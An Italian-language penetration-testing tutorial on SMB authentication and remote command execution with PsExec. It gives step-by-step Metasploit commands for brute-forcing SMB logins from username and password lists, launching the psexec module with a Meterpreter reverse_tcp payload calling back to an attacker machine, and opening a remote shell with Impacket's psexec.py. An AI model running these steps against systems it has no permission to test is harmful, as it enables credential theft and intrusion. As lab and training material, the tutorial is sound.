# Exploiting SMB con PsExec

## Introduzione all’autenticazione SMB

Il protocollo **SMB (Server Message Block)** viene utilizzato nei sistemi Windows per la condivisione di file, stampanti e risorse di rete. SMB supporta due principali modalità di autenticazione:

1. **Autenticazione dell’utente** – richiede un nome utente e una password validi.  
2. **Autenticazione della risorsa condivisa** – richiede solo una password per accedere a una cartella condivisa, senza nome utente.

Durante la procedura di autenticazione SMB, il processo si svolge nel seguente modo:
- Il client invia una richiesta di autenticazione al server, specificando un nome utente.
- Il server risponde con una **stringa casuale (challenge)**.
- Il client cifra questa stringa con l’**hash della password dell’utente** e la invia al server.
- Il server, conoscendo l’hash della password, verifica la risposta.
Se la stringa corrisponde, l’autenticazione viene accettata.

---

## Che cos’è PsExec

**PsExec** è uno strumento sviluppato da Sysinternals (Microsoft) che consente di **eseguire comandi e processi su sistemi Windows remoti**.  
Può essere considerato un’alternativa più leggera di RDP: anziché accedere con un’interfaccia grafica, PsExec fornisce un accesso testuale simile al terminale, eseguendo comandi CMD da remoto.

Il suo funzionamento si basa sul protocollo SMB: ciò significa che può essere utilizzato per autenticarsi ed eseguire comandi su un host remoto **senza bisogno di vulnerabilità**, a condizione di possedere credenziali valide.

---

## 1 – Enumerazione delle credenziali con brute force

Uno dei modi più comuni per ottenere credenziali valide è il **brute force** sul servizio SMB.  
In Metasploit esiste un modulo apposito:

`use auxiliary/scanner/smb/smb_login` ⟶ modulo per tentare autenticazioni SMB. <br>
`set RHOSTS <IP>` ⟶ indirizzo target. <br>
`set USER_FILE <lista_username.txt>` ⟶ file contenente possibili username. <br>
`set PASS_FILE <lista_passwords.txt>` ⟶ file contenente possibili password. <br>
`run` ⟶ avvia il brute force. <br>

Se il modulo restituisce una coppia valida di credenziali possiamo visualizzarle con `creds`

---

## 2 – Alternativa con Metasploit

Metasploit offre anche un modulo per sfruttare SMB usando credenziali valide:

`use exploit/windows/smb/psexec` ⟶ modulo per eseguire comandi su target Windows. <br>
`set RHOSTS <IP>` ⟶ indirizzo del sistema bersaglio. <br>
`set SMBUser <username>` ⟶ nome utente. <br>
`set SMBPass <password>` ⟶ password. <br>
`set PAYLOAD windows/meterpreter/reverse_tcp` ⟶ tipo di payload. <br>
`set LHOST <KaliIP>` ⟶ IP della macchina di attacco. <br>
`set LPORT <Port>` ⟶ porta su cui ricevere la shell. <br>
`run` ⟶ avvia l’exploit. <br>

Questo modulo carica una reverse shell sul target e restituisce una sessione Meterpreter. Da lì:

`getuid` ⟶ mostra il contesto utente. <br>
`shell` ⟶ apre un prompt CMD. <br>
`search -f <file>` ⟶ cerca in tutto il filesystem un file <br>

---

## 3 – Accesso remoto con psexec.py (Impacket)

Lo strumento `psexec.py` della suite **Impacket** consente di autenticarsi e ottenere una shell CMD:

`psexec.py <username>@<IP> cmd.exe` ⟶ connessione remota tramite SMB con prompt dei comandi. <br>

si trova al path `/usr/share/doc/python3-impacket/examples/psexec.py` <br>

Dopo l’invio del comando, verrà chiesta la password. Inserendo quella corretta, si otterrà accesso al prompt di Windows con i privilegi dell’utente fornito.

Questo tipo di autenticazione è **totalmente legittima**, non sfrutta vulnerabilità, e viene spesso usata da amministratori di sistema per gestire host remoti.

---
